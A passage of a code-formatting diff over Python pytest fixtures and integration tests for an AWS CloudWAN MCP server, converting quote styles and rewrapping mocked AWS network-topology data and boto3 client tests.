+                "is_primary": region == config["primary_region"],
+                "availability_zones": [f"{region}a", f"{region}b", f"{region}c"],
+                "core_networks": [
                     {
-                        'CoreNetworkId': f'core-network-{region}',
-                        'GlobalNetworkId': 'global-network-worldwide',
-                        'State': 'AVAILABLE',
-                        'PolicyVersionId': '1'
+                        "CoreNetworkId": f"core-network-{region}",
+                        "GlobalNetworkId": "global-network-worldwide",
+                        "State": "AVAILABLE",
+                        "PolicyVersionId": "1",
                     }
                 ],
-                'transit_gateways': [
+                "transit_gateways": [
                     {
-                        'TransitGatewayId': f'tgw-{region}',
-                        'State': 'available',
-                        'AmazonSideAsn': 64512 + i,
-                        'DefaultRouteTableId': f'tgw-rtb-{region}',
-                        'Description': f'Primary TGW for {region}'
+                        "TransitGatewayId": f"tgw-{region}",
+                        "State": "available",
+                        "AmazonSideAsn": 64512 + i,
+                        "DefaultRouteTableId": f"tgw-rtb-{region}",
+                        "Description": f"Primary TGW for {region}",
                     }
                 ],
-                'vpcs': [],
-                'route_tables': [
+                "vpcs": [],
+                "route_tables": [
                     {
-                        'RouteTableId': f'tgw-rtb-{region}',
-                        'TransitGatewayId': f'tgw-{region}',
-                        'State': 'available',
-                        'DefaultAssociationRouteTable': True,
-                        'DefaultPropagationRouteTable': True
+                        "RouteTableId": f"tgw-rtb-{region}",
+                        "TransitGatewayId": f"tgw-{region}",
+                        "State": "available",
+                        "DefaultAssociationRouteTable": True,
+                        "DefaultPropagationRouteTable": True,
                     }
-                ]
+                ],
             }
 
             # Generate VPCs per region
-            vpcs_per_region = 5 if region == config['primary_region'] else 3
+            vpcs_per_region = 5 if region == config["primary_region"] else 3
             for vpc_idx in range(vpcs_per_region):
                 vpc = {
-                    'VpcId': f'vpc-{region}-{vpc_idx:03d}',
-                    'State': 'available',
-                    'CidrBlock': f'10.{i * 10 + vpc_idx}.0.0/16',
-                    'Region': region,
-                    'AvailabilityZone': region_config['availability_zones'][vpc_idx % len(region_config['availability_zones'])],
-                    'Tags': [
-                        {'Key': 'Name', 'Value': f'Global VPC {vpc_idx} - {region}'},
-                        {'Key': 'Region', 'Value': region},
-                        {'Key': 'Tier', 'Value': ['web', 'app', 'db'][vpc_idx % 3]}
-                    ]
+                    "VpcId": f"vpc-{region}-{vpc_idx:03d}",
+                    "State": "available",
+                    "CidrBlock": f"10.{i * 10 + vpc_idx}.0.0/16",
+                    "Region": region,
+                    "AvailabilityZone": region_config["availability_zones"][
+                        vpc_idx % len(region_config["availability_zones"])
+                    ],
+                    "Tags": [
+                        {"Key": "Name", "Value": f"Global VPC {vpc_idx} - {region}"},
+                        {"Key": "Region", "Value": region},
+                        {"Key": "Tier", "Value": ["web", "app", "db"][vpc_idx % 3]},
+                    ],
                 }
-                region_config['vpcs'].append(vpc)
+                region_config["vpcs"].append(vpc)
 
-            config['regions'][region] = region_config
+            config["regions"][region] = region_config
 
         # Add cross-region connections
-        config['cross_region_connections'] = []
-        primary = config['primary_region']
-        for secondary in config['secondary_regions']:
+        config["cross_region_connections"] = []
+        primary = config["primary_region"]
+        for secondary in config["secondary_regions"]:
             connection = {
-                'ConnectionType': 'TGWPeering',
-                'RequesterRegion': primary,
-                'AccepterRegion': secondary,
-                'RequesterTGW': f'tgw-{primary}',
-                'AccepterTGW': f'tgw-{secondary}',
-                'State': 'available'
+                "ConnectionType": "TGWPeering",
+                "RequesterRegion": primary,
+                "AccepterRegion": secondary,
+                "RequesterTGW": f"tgw-{primary}",
+                "AccepterTGW": f"tgw-{secondary}",
+                "State": "available",
             }
-            config['cross_region_connections'].append(connection)
+            config["cross_region_connections"].append(connection)
 
         return config
 
@@ -658,79 +659,76 @@
     def generate_disaster_recovery_config() -> Dict[str, Any]:
         """Generate disaster recovery configuration."""
         config = {
-            'deployment_type': 'disaster_recovery',
-            'primary_site': {
-                'region': 'us-east-1',
-                'availability_zones': ['us-east-1a', 'us-east-1b', 'us-east-1c'],
-                'rto': 300,  # 5 minutes
-                'rpo': 900   # 15 minutes
+            "deployment_type": "disaster_recovery",
+            "primary_site": {
+                "region": "us-east-1",
+                "availability_zones": ["us-east-1a", "us-east-1b", "us-east-1c"],
+                "rto": 300,  # 5 minutes
+                "rpo": 900,  # 15 minutes
+            },
+            "dr_site": {
+                "region": "us-west-2",
+                "availability_zones": ["us-west-2a", "us-west-2b", "us-west-2c"],
+                "rto": 600,  # 10 minutes
+                "rpo": 3600,  # 1 hour
             },
-            'dr_site': {
-                'region': 'us-west-2',
-                'availability_zones': ['us-west-2a', 'us-west-2b', 'us-west-2c'],
-                'rto': 600,  # 10 minutes
-                'rpo': 3600  # 1 hour
+            "replication": {
+                "method": "async",
+                "frequency": 300,  # 5 minutes
+                "backup_retention": 30,  # 30 days
             },
-            'replication': {
-                'method': 'async',
-                'frequency': 300,  # 5 minutes
-                'backup_retention': 30  # 30 days
+            "failover_automation": {
+                "enabled": True,
+                "health_checks": ["core_network_connectivity", "transit_gateway_status", "vpc_routing_health"],
             },
-            'failover_automation': {
-                'enabled': True,
-                'health_checks': [
-                    'core_network_connectivity',
-                    'transit_gateway_status',
-                    'vpc_routing_health'
-                ]
-            }
         }
 
         # Generate resources for both sites
-        for site_name, site_config in [('primary_site', config['primary_site']), ('dr_site', config['dr_site'])]:
-            region = site_config['region']
+        for site_name, site_config in [("primary_site", config["primary_site"]), ("dr_site", config["dr_site"])]:
+            region = site_config["region"]
 
             # Core network resources
-            site_config['resources'] = {
-                'core_networks': [
+            site_config["resources"] = {
+                "core_networks": [
                     {
-                        'CoreNetworkId': f'core-network-{region}-dr',
-                        'GlobalNetworkId': 'global-network-dr',
-                        'State': 'AVAILABLE',
-                        'Description': f'DR core network for {region}'
+                        "CoreNetworkId": f"core-network-{region}-dr",
+                        "GlobalNetworkId": "global-network-dr",
+                        "State": "AVAILABLE",
+                        "Description": f"DR core network for {region}",
                     }
                 ],
-                'transit_gateways': [
+                "transit_gateways": [
                     {
-                        'TransitGatewayId': f'tgw-dr-{region}',
-                        'State': 'available',
-                        'Description': f'DR transit gateway for {region}',
-                        'AmazonSideAsn': 64512 if site_name == 'primary_site' else 64513
+                        "TransitGatewayId": f"tgw-dr-{region}",
+                        "State": "available",
+                        "Description": f"DR transit gateway for {region}",
+                        "AmazonSideAsn": 64512 if site_name == "primary_site" else 64513,
                     }
                 ],
-                'vpcs': []
+                "vpcs": [],
             }
 
             # Generate DR VPCs
-            for i, az in enumerate(site_config['availability_zones']):
+            for i, az in enumerate(site_config["availability_zones"]):
                 vpc = {
-                    'VpcId': f'vpc-dr-{region}-{i:03d}',
-                    'State': 'available',
-                    'CidrBlock': f'10.{100 if site_name == "primary_site" else 200}.{i}.0/24',
-                    'AvailabilityZone': az,
-                    'Tags': [
-                        {'Key': 'Name', 'Value': f'DR VPC {i} - {region}'},
-                        {'Key': 'DR-Site', 'Value': site_name},
-                        {'Key': 'Criticality', 'Value': 'High'}
-                    ]
+                    "VpcId": f"vpc-dr-{region}-{i:03d}",
+                    "State": "available",
+                    "CidrBlock": f"10.{100 if site_name == 'primary_site' else 200}.{i}.0/24",
+                    "AvailabilityZone": az,
+                    "Tags": [
+                        {"Key": "Name", "Value": f"DR VPC {i} - {region}"},
+                        {"Key": "DR-Site", "Value": site_name},
+                        {"Key": "Criticality", "Value": "High"},
+                    ],
                 }
-                site_config['resources']['vpcs'].append(vpc)
+                site_config["resources"]["vpcs"].append(vpc)
 
         return config
 
 
 # Pytest fixtures using the generator classes above
 
+
 @pytest.fixture(scope="session")
 def enterprise_hub_spoke_topology():
     """Fixture providing enterprise hub-and-spoke topology."""
@@ -788,21 +786,18 @@
 @pytest.fixture(scope="function")
 def random_network_topology():
     """Fixture providing randomly generated network topology for each test."""
-    topology_types = ['hub_spoke', 'mesh', 'hierarchical']
+    topology_types = ["hub_spoke", "mesh", "hierarchical"]
     topology_type = random.choice(topology_types)
 
-    if topology_type == 'hub_spoke':
+    if topology_type == "hub_spoke":
         return NetworkTopologyFixtures.generate_enterprise_hub_spoke_topology(
-            regions=random.randint(2, 6),
-            spokes_per_region=random.randint(3, 15)
+            regions=random.randint(2, 6), spokes_per_region=random.randint(3, 15)
         )
-    elif topology_type == 'mesh':
+    elif topology_type == "mesh":
         return NetworkTopologyFixtures.generate_mesh_topology(
-            regions=random.randint(2, 5),
-            vpcs_per_region=random.randint(2, 10)
+            regions=random.randint(2, 5), vpcs_per_region=random.randint(2, 10)
         )
     else:  # hierarchical
         return NetworkTopologyFixtures.generate_hierarchical_topology(
-            levels=random.randint(2, 4),
-            branches_per_level=random.randint(2, 6)
+            levels=random.randint(2, 4), branches_per_level=random.randint(2, 6)
         )

--- cloudwan-mcp-server/tests/integration/__init__.py
+++ cloudwan-mcp-server/tests/integration/__init__.py
@@ -12,4 +12,4 @@
 # See the License for the specific language governing permissions and
 # limitations under the License.
 
-"""Integration tests for AWS CloudWAN MCP Server."""
\ No newline at end of file
+"""Integration tests for AWS CloudWAN MCP Server."""

--- cloudwan-mcp-server/tests/integration/test_aws_integration.py
+++ cloudwan-mcp-server/tests/integration/test_aws_integration.py
@@ -41,6 +41,7 @@
 
             # Clear any existing cached clients
             from awslabs.cloudwan_mcp_server.server import _create_client
+
             _create_client.cache_clear()
 
             # Test VPC discovery
@@ -68,6 +69,7 @@
             vpc3 = ec2.create_vpc(CidrBlock="192.168.0.0/16")
 
             from awslabs.cloudwan_mcp_server.server import _create_client
+
             _create_client.cache_clear()
 
             result = await discover_vpcs("us-west-2")
@@ -85,17 +87,15 @@
     @pytest.mark.asyncio
     async def test_aws_client_error_propagation(self):
         """Test that AWS client errors are properly propagated."""
-        with patch('awslabs.cloudwan_mcp_server.server.get_aws_client') as mock_client:
+        with patch("awslabs.cloudwan_mcp_server.server.get_aws_client") as mock_client:
             # Mock ClientError
             error_response = {
-                'Error': {
-                    'Code': 'UnauthorizedOperation',
-                    'Message': 'You are not authorized to perform this operation'
+                "Error": {
+                    "Code": "UnauthorizedOperation",
+                    "Message": "You are not authorized to perform this operation",
                 }
             }
-            mock_client.return_value.list_core_networks.side_effect = ClientError(
-                error_response, 'ListCoreNetworks'
-            )
+            mock_client.return_value.list_core_networks.side_effect = ClientError(error_response, "ListCoreNetworks")
 
             result = await list_core_networks("us-east-1")
             response = json.loads(result)
@@ -107,17 +107,10 @@
     @pytest.mark.asyncio
     async def test_aws_service_availability(self):
         """Test handling of AWS service availability issues."""
-        with patch('awslabs.cloudwan_mcp_server.server.get_aws_client') as mock_client:
+        with patch("awslabs.cloudwan_mcp_server.server.get_aws_client") as mock_client:
             # Mock service unavailable error
-            error_response = {
-                'Error': {
-                    'Code': 'ServiceUnavailable',
-                    'Message': 'Service is temporarily unavailable'
-                }
-            }
-            mock_client.return_value.describe_vpcs.side_effect = ClientError(
-                error_response, 'DescribeVpcs'
-            )
+            error_response = {"Error": {"Code": "ServiceUnavailable", "Message": "Service is temporarily unavailable"}}
+            mock_client.return_value.describe_vpcs.side_effect = ClientError(error_response, "DescribeVpcs")
 
             result = await discover_vpcs("us-east-1")
             response = json.loads(result)
@@ -128,7 +121,7 @@
     @pytest.mark.asyncio
     async def test_regional_client_isolation(self):
         """Test that different regions use isolated clients."""
-        with patch('awslabs.cloudwan_mcp_server.server.get_aws_client') as mock_get_client:
+        with patch("awslabs.cloudwan_mcp_server.server.get_aws_client") as mock_get_client:
             # Setup different responses for different regions
             east_client = Mock()
             west_client = Mock()
@@ -165,8 +158,8 @@
     async def test_aws_profile_integration(self):
         """Test AWS profile handling integration."""
         from awslabs.cloudwan_mcp_server.server import aws_config, _create_client
-        
-        with patch('boto3.Session') as mock_session:
+
+        with patch("boto3.Session") as mock_session:
             mock_session_instance = Mock()
             mock_session.return_value = mock_session_instance
             mock_client = Mock()
@@ -174,7 +167,7 @@
             mock_session_instance.client.return_value = mock_client
 
             # Mock the aws_config profile directly
-            with patch.object(aws_config, 'profile', 'test-profile'):
+            with patch.object(aws_config, "profile", "test-profile"):
                 _create_client.cache_clear()  # Clear cache to force new client creation
 
                 result = await list_core_networks("us-east-1")
@@ -188,14 +181,14 @@
     async def test_default_credentials_fallback(self):
         """Test fallback to default credentials when no profile is set."""
         from awslabs.cloudwan_mcp_server.server import aws_config, _create_client
-        
-        with patch('boto3.client') as mock_client_func:
+
+        with patch("boto3.client") as mock_client_func:
             mock_client = Mock()
             mock_client.list_core_networks.return_value = {"CoreNetworks": []}
             mock_client_func.return_value = mock_client
 
             # Mock the aws_config profile to None
-            with patch.object(aws_config, 'profile', None):
+            with patch.object(aws_config, "profile", None):
                 _create_client.cache_clear()
 
                 result = await list_core_networks("us-east-1")
@@ -209,12 +202,12 @@
     async def test_invalid_profile_handling(self):
         """Test handling of invalid AWS profile."""
         from awslabs.cloudwan_mcp_server.server import aws_config, _create_client
-        
-        with patch('boto3.Session') as mock_session:
+
+        with patch("boto3.Session") as mock_session:
             mock_session.side_effect = Exception("Profile not found")
 
             # Mock the aws_config profile to invalid profile
-            with patch.object(aws_config, 'profile', 'invalid-profile'):
+            with patch.object(aws_config, "profile", "invalid-profile"):
                 _create_client.cache_clear()
 
                 result = await list_core_networks("us-east-1")
@@ -230,11 +223,11 @@
     def test_boto3_config_parameters(self):
         """Test that boto3 clients are configured with correct parameters."""
         from awslabs.cloudwan_mcp_server.server import aws_config, _create_client, get_aws_client
-        
-        with patch.object(aws_config, 'profile', None):
+
+        with patch.object(aws_config, "profile", None):
             _create_client.cache_clear()  # Clear cache to force client creation
 
-            with patch('boto3.client') as mock_client:
+            with patch("boto3.client") as mock_client:
                 mock_client.return_value = Mock()
 
                 client = get_aws_client("networkmanager", "eu-central-1")
@@ -253,19 +246,14 @@
     @pytest.mark.asyncio
     async def test_connection_retry_behavior(self):
         """Test connection retry behavior with transient errors."""
-        with patch('awslabs.cloudwan_mcp_server.server.get_aws_client') as mock_get_client:
+        with patch("awslabs.cloudwan_mcp_server.server.get_aws_client") as mock_get_client:
             mock_client = Mock()
 
             # Simulate transient network error that succeeds on retry
-            error_response = {
-                'Error': {
-                    'Code': 'RequestTimeout',
-                    'Message': 'Request timed out'
-                }
-            }
+            error_response = {"Error": {"Code": "RequestTimeout", "Message": "Request timed out"}}
             mock_client.list_core_networks.side_effect = [
-                ClientError(error_response, 'ListCoreNetworks'),
-                {"CoreNetworks": [{"CoreNetworkId": "success"}]}
+                ClientError(error_response, "ListCoreNetworks"),
+                {"CoreNetworks": [{"CoreNetworkId": "success"}]},
             ]
             mock_get_client.return_value = mock_client
 
@@ -279,7 +267,7 @@
     @pytest.mark.asyncio
     async def test_multi_region_isolation(self):
         """Test that multi-region operations are properly isolated."""
-        with patch('awslabs.cloudwan_mcp_server.server.get_aws_client') as mock_get_client:
+        with patch("awslabs.cloudwan_mcp_server.server.get_aws_client") as mock_get_client:
             # Track calls per region
             region_calls = {}
 
@@ -321,31 +309,23 @@
             get_core_network_policy,
             list_core_networks,
         )
-        
+
         # Configure NetworkManager mock with proper client patching
         nm_mocker = aws_service_mocker("networkmanager", "us-east-1")
-        nm_mocker.configure_core_networks([
-            {"CoreNetworkId": "cn-123", "State": "AVAILABLE"},
-            {"CoreNetworkId": "cn-456", "State": "PENDING"}
-        ])
+        nm_mocker.configure_core_networks(
+            [{"CoreNetworkId": "cn-123", "State": "AVAILABLE"}, {"CoreNetworkId": "cn-456", "State": "PENDING"}]
+        )
 
         # Add policy mock
         nm_mocker.client.get_core_network_policy.return_value = {
-            "CoreNetworkPolicy": {
-                "PolicyVersionId": 1,
-                "PolicyDocument": {}
-            }
+            "CoreNetworkPolicy": {"PolicyVersionId": 1, "PolicyDocument": {}}
         }
 
         # Add change set mock
-        nm_mocker.client.get_core_network_change_set.return_value = {
-            "CoreNetworkChanges": [
-                {"Type": "POLICY_CHANGE"}
-            ]
-        }
+        nm_mocker.client.get_core_network_change_set.return_value = {"CoreNetworkChanges": [{"Type": "POLICY_CHANGE"}]}
 
         # Patch get_aws_client to return our configured mock
-        with patch('awslabs.cloudwan_mcp_server.server.get_aws_client') as mock_get_client:
+        with patch("awslabs.cloudwan_mcp_server.server.get_aws_client") as mock_get_client:
             mock_get_client.return_value = nm_mocker.client
 
             # Test tool chaining
@@ -371,23 +351,16 @@
         """Test that errors propagate correctly in tool workflows."""
         from awslabs.cloudwan_mcp_server.server import get_core_network_policy
         from botocore.exceptions import ClientError
-        
+
         # Configure error in policy retrieval
         nm_mocker = aws_service_mocker("networkmanager", "us-east-1")
-        
+
         # Create a proper ClientError for the mock
-        error_response = {
-            'Error': {
-                'Code': 'ResourceNotFoundException',
-                'Message': 'Core network not found'
-            }
-        }
-        nm_mocker.client.get_core_network_policy.side_effect = ClientError(
-            error_response, 'GetCoreNetworkPolicy'
-        )
+        error_response = {"Error": {"Code": "ResourceNotFoundException", "Message": "Core network not found"}}
+        nm_mocker.client.get_core_network_policy.side_effect = ClientError(error_response, "GetCoreNetworkPolicy")
 
         # Patch get_aws_client to return our configured mock
-        with patch('awslabs.cloudwan_mcp_server.server.get_aws_client') as mock_get_client:
+        with patch("awslabs.cloudwan_mcp_server.server.get_aws_client") as mock_get_client:
             mock_get_client.return_value = nm_mocker.client
 
             result = await get_core_network_policy("invalid-network-id")

--- cloudwan-mcp-server/tests/integration/test_aws_labs_compliance.py
+++ cloudwan-mcp-server/tests/integration/test_aws_labs_compliance.py
@@ -34,14 +34,14 @@
     async def test_mcp_protocol_compliance(self, mock_get_aws_client):
         """Test MCP protocol v1.1+ compliance following AWS Labs patterns."""
         # Test tool registration and availability
-        assert hasattr(mcp, 'list_tools'), "MCP server must expose list_tools method"
+        assert hasattr(mcp, "list_tools"), "MCP server must expose list_tools method"
 
         # Test basic protocol compliance
         tools = await mcp.list_tools()
         assert len(tools) >= 10, f"Must have at least 10 core CloudWAN tools, found {len(tools)}"
 
         # Test async compatibility - tools are already registered as async in FastMCP
-        assert all(hasattr(tool, 'name') for tool in tools), "All tools must have names"
+        assert all(hasattr(tool, "name") for tool in tools), "All tools must have names"
         assert all(tool.name for tool in tools), "All tools must have non-empty names"
 
     @pytest.mark.live
@@ -54,45 +54,46 @@
         # Following AWS Labs pattern for live API testing
         result = await list_core_networks()
         assert isinstance(result, dict)
-        assert 'success' in result
+        assert "success" in result
 
     @pytest.mark.asyncio
     async def test_mocked_aws_service_integration(self, aws_service_mocker):
         """Test AWS service integration with moto mocking (AWS Labs pattern)."""
         # Create mock NetworkManager client
-        nm_mocker = aws_service_mocker('networkmanager', 'us-east-1')
-        
+        nm_mocker = aws_service_mocker("networkmanager", "us-east-1")
+
         # Configure core networks mock data
-        nm_mocker.client.list_core_networks = Mock(return_value={
-            'CoreNetworks': [
-                {
-                    'CoreNetworkId': 'core-network-test123',
-                    'CoreNetworkArn': 'arn:aws:networkmanager::123456789012:core-network/core-network-test123',
-                    'GlobalNetworkId': 'global-network-test123',
-                    'State': 'AVAILABLE',
-                    'Description': 'Test core network'
-                }
-            ]
-        })
+        nm_mocker.client.list_core_networks = Mock(
+            return_value={
+                "CoreNetworks": [
+                    {
+                        "CoreNetworkId": "core-network-test123",
+                        "CoreNetworkArn": "arn:aws:networkmanager::123456789012:core-network/core-network-test123",
+                        "GlobalNetworkId": "global-network-test123",
+                        "State": "AVAILABLE",
+                        "Description": "Test core network",
+                    }
+                ]
+            }
+        )
 
-        with patch('awslabs.cloudwan_mcp_server.server.get_aws_client') as mock_get_client:
+        with patch("awslabs.cloudwan_mcp_server.server.get_aws_client") as mock_get_client:
             mock_get_client.return_value = nm_mocker.client
             result = await list_core_networks()
             # Parse JSON response to dict
             result = json.loads(result)
-            assert result['success'] is True
-            assert len(result['data']) >= 0
+            assert result["success"] is True
+            assert len(result["data"]) >= 0
 
     @pytest.mark.asyncio
     async def test_error_handling_patterns(self, aws_service_mocker):
         """Test AWS Labs standard error handling patterns."""
         # Create mock NetworkManager client
-        nm_mocker = aws_service_mocker('networkmanager', 'us-east-1')
+        nm_mocker = aws_service_mocker("networkmanager", "us-east-1")
 
         # Configure mock to raise error
         nm_mocker.client.list_core_networks.side_effect = ClientError(
-            {'Error': {'Code': 'AccessDenied', 'Message': 'Access denied'}},
-            'ListCoreNetworks'
+            {"Error": {"Code": "AccessDenied", "Message": "Access denied"}}, "ListCoreNetworks"
         )
 
         # Test with error
@@ -101,9 +102,9 @@
         result = json.loads(result)
 
         # AWS Labs standard error response format
-        assert result['success'] is False
-        assert 'error' in result
-        assert 'error_code' in result
+        assert result["success"] is False
+        assert "error" in result
+        assert "error_code" in result
 
     @pytest.mark.slow
     @pytest.mark.asyncio
@@ -111,9 +112,9 @@
         """Test performance following AWS Labs patterns."""
         import time
 
-        with patch('awslabs.cloudwan_mcp_server.utils.aws_config_manager.get_aws_client') as mock_get_client:
+        with patch("awslabs.cloudwan_mcp_server.utils.aws_config_manager.get_aws_client") as mock_get_client:
             mock_client = Mock()
-            mock_client.list_core_networks.return_value = {'CoreNetworks': []}
+            mock_client.list_core_networks.return_value = {"CoreNetworks": []}
             mock_get_client.return_value = mock_client
 
             start_time = time.time()
@@ -122,7 +123,7 @@
 
             # Performance assertion following AWS Labs patterns
             assert (end_time - start_time) < 5.0, "Tool should complete within 5 seconds"
-            assert result['success'] is True
+            assert result["success"] is True
 
     @pytest.mark.unit
     @pytest.mark.asyncio
@@ -130,16 +131,16 @@
         """Test tool registration follows AWS Labs patterns."""
         tools = await mcp.list_tools()
         registered_tools = [tool.name for tool in tools]
-        
+
         # Check for expected core tools
         expected_core_tools = [
-            'trace_network_path',
-            'list_core_networks',
-            'get_global_networks',
-            'discover_vpcs',
-            'validate_ip_cidr'
+            "trace_network_path",
+            "list_core_networks",
+            "get_global_networks",
+            "discover_vpcs",
+            "validate_ip_cidr",
         ]
-        
+
         for tool_name in expected_core_tools:
             assert tool_name in registered_tools, f"Tool {tool_name} not registered"
 
@@ -147,60 +148,56 @@
     async def test_aws_credential_handling(self, secure_aws_credentials):
         """Test AWS credential handling following AWS Labs patterns."""
         # Test that tools handle missing credentials gracefully
-        with patch('boto3.client') as mock_boto_client:
+        with patch("boto3.client") as mock_boto_client:
             mock_boto_client.side_effect = Exception("No credentials found")
 
             result = await list_core_networks()
 
             # Should return error response, not raise exception
             assert isinstance(result, dict)
-            assert 'error' in result or 'success' in result
+            assert "error" in result or "success" in result
 
     @pytest.mark.integration
     @pytest.mark.asyncio
     async def test_tool_chaining_patterns(self, mock_aws_context):
         """Test tool chaining following AWS Labs integration patterns."""
-        with patch('awslabs.cloudwan_mcp_server.utils.aws_config_manager.get_aws_client') as mock_get_client:
+        with patch("awslabs.cloudwan_mcp_server.utils.aws_config_manager.get_aws_client") as mock_get_client:
             mock_client = Mock()
 
             # Mock sequential API calls
             mock_client.describe_global_networks.return_value = {
-                'GlobalNetworks': [{'GlobalNetworkId': 'gn-123', 'State': 'AVAILABLE'}]
+                "GlobalNetworks": [{"GlobalNetworkId": "gn-123", "State": "AVAILABLE"}]
             }
             mock_client.list_core_networks.return_value = {
-                'CoreNetworks': [{'CoreNetworkId': 'cn-123', 'GlobalNetworkId': 'gn-123'}]
+                "CoreNetworks": [{"CoreNetworkId": "cn-123", "GlobalNetworkId": "gn-123"}]
             }
             mock_client.get_core_network_policy.return_value = {
-                'CoreNetworkPolicy': {'PolicyVersionId': 1, 'PolicyDocument': {}}
+                "CoreNetworkPolicy": {"PolicyVersionId": 1, "PolicyDocument": {}}
             }
 
             mock_get_client.return_value = mock_client
 
             # Test chaining: global networks -> core networks -> policy
             global_networks = await get_global_networks()
-            assert global_networks['success'] is True
+            assert global_networks["success"] is True
 
             core_networks = await list_core_networks()
-            assert core_networks['success'] is True
+            assert core_networks["success"] is True
 
-            policy = await get_core_network_policy('cn-123')
-            assert policy['success'] is True
+            policy = await get_core_network_policy("cn-123")
+            assert policy["success"] is True
 
     @pytest.mark.asyncio
     async def test_concurrent_tool_execution(self, mock_aws_context):
         """Test concurrent tool execution following AWS Labs patterns."""
-        with patch('awslabs.cloudwan_mcp_server.server.get_aws_client') as mock_get_client:
+        with patch("awslabs.cloudwan_mcp_server.server.get_aws_client") as mock_get_client:
             mock_client = Mock()
-            mock_client.describe_global_networks.return_value = {'GlobalNetworks': []}
-            mock_client.list_core_networks.return_value = {'CoreNetworks': []}
+            mock_client.describe_global_networks.return_value = {"GlobalNetworks": []}
+            mock_client.list_core_networks.return_value = {"CoreNetworks": []}
             mock_get_client.return_value = mock_client
 
             # Test concurrent execution
-            tasks = [
-                get_global_networks(),
-                list_core_networks(),
-                get_global_networks()
-            ]
+            tasks = [get_global_networks(), list_core_networks(), get_global_networks()]
 
             results = await asyncio.gather(*tasks, return_exceptions=True)
 
@@ -209,4 +206,4 @@
                 assert not isinstance(result, Exception)
                 # Parse JSON to dict
                 result = json.loads(result)
-                assert result['success'] is True
+                assert result["success"] is True

--- cloudwan-mcp-server/tests/integration/test_aws_service_mocking.py
+++ cloudwan-mcp-server/tests/integration/test_aws_service_mocking.py
@@ -39,51 +39,39 @@
         # Create comprehensive mock response
         mock_core_networks = [
             {
-                'CoreNetworkId': 'core-network-01234567890abcdef',
-                'GlobalNetworkId': 'global-network-01234567890abcdef',
-                'State': 'AVAILABLE',
-                'Description': 'Production CloudWAN Core Network',
-                'CreatedAt': datetime(2024, 1, 15, 10, 30, 45, tzinfo=timezone.utc),
-                'Tags': [
-                    {'Key': 'Environment', 'Value': 'Production'},
-                    {'Key': 'Team', 'Value': 'NetworkOps'}
-                ]
+                "CoreNetworkId": "core-network-01234567890abcdef",
+                "GlobalNetworkId": "global-network-01234567890abcdef",
+                "State": "AVAILABLE",
+                "Description": "Production CloudWAN Core Network",
+                "CreatedAt": datetime(2024, 1, 15, 10, 30, 45, tzinfo=timezone.utc),
+                "Tags": [{"Key": "Environment", "Value": "Production"}, {"Key": "Team", "Value": "NetworkOps"}],
             },
             {
-                'CoreNetworkId': 'core-network-fedcba0987654321',
-                'GlobalNetworkId': 'global-network-fedcba0987654321',
-                'State': 'UPDATING',
-                'Description': 'Development CloudWAN Core Network',
-                'CreatedAt': datetime(2024, 1, 16, 14, 20, 30, tzinfo=timezone.utc),
-                'Tags': [
-                    {'Key': 'Environment', 'Value': 'Development'},
-                    {'Key': 'Team', 'Value': 'DevOps'}
-                ]
-            }
+                "CoreNetworkId": "core-network-fedcba0987654321",
+                "GlobalNetworkId": "global-network-fedcba0987654321",
+                "State": "UPDATING",
+                "Description": "Development CloudWAN Core Network",
+                "CreatedAt": datetime(2024, 1, 16, 14, 20, 30, tzinfo=timezone.utc),
+                "Tags": [{"Key": "Environment", "Value": "Development"}, {"Key": "Team", "Value": "DevOps"}],
+            },
         ]
 
-        with patch('awslabs.cloudwan_mcp_server.server.get_aws_client') as mock_get_client:
+        with patch("awslabs.cloudwan_mcp_server.server.get_aws_client") as mock_get_client:
             mock_client = Mock()
-            mock_client.list_core_networks.return_value = {
-                'CoreNetworks': mock_core_networks,
-                'NextToken': None
-            }
+            mock_client.list_core_networks.return_value = {"CoreNetworks": mock_core_networks, "NextToken": None}
             mock_get_client.return_value = mock_client
 
-            result = await list_core_networks(region='us-east-1')
+            result = await list_core_networks(region="us-east-1")
 
             parsed = json.loads(result)
-            assert parsed['success'] is True
-            assert parsed['total_count'] == 2
-            assert len(parsed['core_networks']) == 2
+            assert parsed["success"] is True
+            assert parsed["total_count"] == 2
+            assert len(parsed["core_networks"]) == 2
 
             # Verify detailed network attributes
-            prod_network = next(
-                (n for n in parsed['core_networks'] if n['State'] == 'AVAILABLE'),
-                None
-            )
+            prod_network = next((n for n in parsed["core_networks"] if n["State"] == "AVAILABLE"), None)
             assert prod_network is not None
-            assert prod_network['Description'] == 'Production CloudWAN Core Network'
+            assert prod_network["Description"] == "Production CloudWAN Core Network"
 
             # Verify API call parameters
             mock_client.list_core_networks.assert_called_once()
@@ -94,161 +82,125 @@
         """Test NetworkManager describe_global_networks with filter scenarios."""
         mock_global_networks = [
             {
-                'GlobalNetworkId': 'global-network-01234567890abcdef',
-                'State': 'AVAILABLE',
-                'Description': 'Multi-region global network',
-                'CreatedAt': datetime(2024, 1, 10, 9, 0, 0, tzinfo=timezone.utc),
-                'Tags': [{'Key': 'Region', 'Value': 'us-east-1'}]
+                "GlobalNetworkId": "global-network-01234567890abcdef",
+                "State": "AVAILABLE",
+                "Description": "Multi-region global network",
+                "CreatedAt": datetime(2024, 1, 10, 9, 0, 0, tzinfo=timezone.utc),
+                "Tags": [{"Key": "Region", "Value": "us-east-1"}],
             }
         ]
 
-        with patch('awslabs.cloudwan_mcp_server.server.get_aws_client') as mock_get_client:
+        with patch("awslabs.cloudwan_mcp_server.server.get_aws_client") as mock_get_client:
             mock_client = Mock()
             mock_client.describe_global_networks.return_value = {
-                'GlobalNetworks': mock_global_networks,
-                'NextToken': None
+                "GlobalNetworks": mock_global_networks,
+                "NextToken": None,
             }
             mock_get_client.return_value = mock_client
 
-            result = await get_global_networks(region='us-east-1')
+            result = await get_global_networks(region="us-east-1")
 
             parsed = json.loads(result)
-            assert parsed['success'] is True
-            assert parsed['total_count'] == 1
-            assert parsed['global_networks'][0]['State'] == 'AVAILABLE'
+            assert parsed["success"] is True
+            assert parsed["total_count"] == 1
+            assert parsed["global_networks"][0]["State"] == "AVAILABLE"
 
             # Verify service and region parameters
-            mock_get_client.assert_called_with('networkmanager', 'us-east-1')
+            mock_get_client.assert_called_with("networkmanager", "us-east-1")
 
     @pytest.mark.integration
     @pytest.mark.asyncio
     async def test_network_manager_core_network_policy_detailed(self):
         """Test NetworkManager get_core_network_policy with complex policy document."""
         complex_policy_doc = {
-            'version': '2021.12',
-            'core-network-configuration': {
-                'asn-ranges': ['64512-64555', '65000-65010'],
-                'edge-locations': [
-                    {
-                        'location': 'us-east-1',
-                        'asn': 64512
-                    },
-                    {
-                        'location': 'us-west-2',
